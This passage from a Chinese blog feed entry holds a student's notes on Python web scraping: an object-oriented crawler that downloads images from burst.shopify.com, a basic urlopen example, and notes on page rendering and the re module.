href="#面向对象爬虫（爬取burst-shopify-com下的图片）" class="headerlink" title="面向对象爬虫（爬取burst.shopify.com下的图片）"></a>面向对象爬虫（爬取burst.shopify.com下的图片）</h1><p>​    所谓面向对象也就是通过创建一个类，再创建若干个对象，然后再统一调动</p><h3 id="代码如下：-1"><a href="#代码如下：-1" class="headerlink" title="代码如下："></a>代码如下：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlretrieve</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tupian</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.base_url=<span class="string">&quot;https://burst.shopify.com/love?page=&#123;&#125;&quot;</span></span><br><span class="line">        self.header=&#123;<span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36&quot;</span></span><br><span class="line">                     &#125;</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Geturl</span>(<span class="params">self</span>):</span></span><br><span class="line">        all_url = []</span><br><span class="line">        <span class="keyword">for</span> <span class="built_in">str</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">3</span>):</span><br><span class="line">            all_url.append(self.base_url.<span class="built_in">format</span>(<span class="built_in">str</span>))</span><br><span class="line">        <span class="keyword">return</span> all_url</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Respons</span>(<span class="params">self,all_url</span>):</span></span><br><span class="line">        text_list = []</span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> all_url:</span><br><span class="line">            r = requests.get(url, headers=self.header)</span><br><span class="line">            text_list.append(r.text)</span><br><span class="line">        <span class="keyword">return</span> text_list</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">clear</span>(<span class="params">self, respons</span>):</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> respons:</span><br><span class="line">            qqq = <span class="string">&quot;https://burst.*?jpg&quot;</span></span><br><span class="line">            pi = re.findall(qqq, i)</span><br><span class="line">            lst=[]</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> pi:   <span class="comment">#遍历jpg</span></span><br><span class="line">                <span class="keyword">if</span> j <span class="keyword">not</span> <span class="keyword">in</span> lst:</span><br><span class="line">                    lst.append(j)</span><br><span class="line">            <span class="keyword">return</span> lst</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">save</span>(<span class="params">self, url_list</span>):</span></span><br><span class="line">        x=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> url_list:</span><br><span class="line">            x = x + <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(url)</span><br><span class="line">            file_name = <span class="string">&quot;E:/大学/python面向对象爬虫/&quot;</span>+ <span class="built_in">str</span>(x) + <span class="string">&quot;.jpg&quot;</span></span><br><span class="line">            urlretrieve(url, file_name)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        titile_url = self.Geturl()</span><br><span class="line">        respons = self.Respons(titile_url)</span><br><span class="line">        picture = self.clear(respons)</span><br><span class="line">        <span class="built_in">print</span>(picture)</span><br><span class="line">        download = self.save(picture)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    tupian = Tupian()</span><br><span class="line">    tupian.run()</span><br></pre></td></tr></table></figure><h1 id="爬虫笔记："><a href="#爬虫笔记：" class="headerlink" title="爬虫笔记："></a>爬虫笔记：</h1><h2 id="抓取网页源代码"><a href="#抓取网页源代码" class="headerlink" title="抓取网页源代码"></a>抓取网页源代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line">url =<span class="string">&quot;http://www.baidu.com&quot;</span></span><br><span class="line">resp = urlopen(url)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;my baidu.html&quot;</span>,<span class="string">&quot;w&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:  <span class="comment">#把读取的数据放入一个html文件里</span></span><br><span class="line">    f.write(resp.read().decode(<span class="string">&quot;utf-8&quot;</span>))<span class="comment">#读取到页面源代码</span></span><br></pre></td></tr></table></figure><h2 id="Web请求过程剖析"><a href="#Web请求过程剖析" class="headerlink" title="Web请求过程剖析"></a>Web请求过程剖析</h2><ul><li>服务器渲染：在服务器那边直接把数据和html整合在一起，统一返回给浏览器</li></ul><ul><li> 客户端渲染：第一次请求只要一个html护甲，第二次请求拿到数据，进行数据展示，也就是在页面源    代码中看不到数据。（因为超链接，已经进入下一个网页）</li></ul><h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/6080384636f52.jpg"></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/6080393d36a4d.jpg"></p><p>​    <strong>.*?   尽可能少的匹配中间字符</strong></p><h2 id="re模块"><a href="#re模块" class="headerlink" title="re模块"></a>re模块</h2><ul><li><p>findall：匹配字符串中所有的符合正则的内容列表，效率不高）</p></li><li><p>finditer：匹配字符串中所有的内容【返回的是迭代器】，从迭代器中拿到内容需要.group()</p><p>​            <code>it = re.finditer(&quot;&quot;,&quot;&quot;)</code></p><p>​            <code>for i in it :</code></p><p>​        <code>print(i,group())</code></p></li><li><p>search：找到一个结果就返回，返回的结果是match对象，拿数据需要.group()</p></li><li><p>预加载正则表达式</p><p>​        <code>obj = re.compile(&quot;\d&quot;)</code></p><p>​        <code>xx=obj.finditer/search()</code></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;普通面向对象（爬取burst-shopify-com下的图片）&quot;&gt;&lt;a href=&quot;#普通面向对象（爬取burst-shopify-com下的图片）&quot; class=&quot;headerlink&quot; title=&quot;普通面向对象（爬取burst.shopify.com下的图片</summary>
      
    
    
    
    <category term="-Python" scheme="https://abinix.top/categories/Python/"/>
    
    
    <category term="-爬虫 -面向对象" scheme="https://abinix.top/tags/%E7%88%AC%E8%99%AB-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"/>
    
  </entry>
  
</feed>
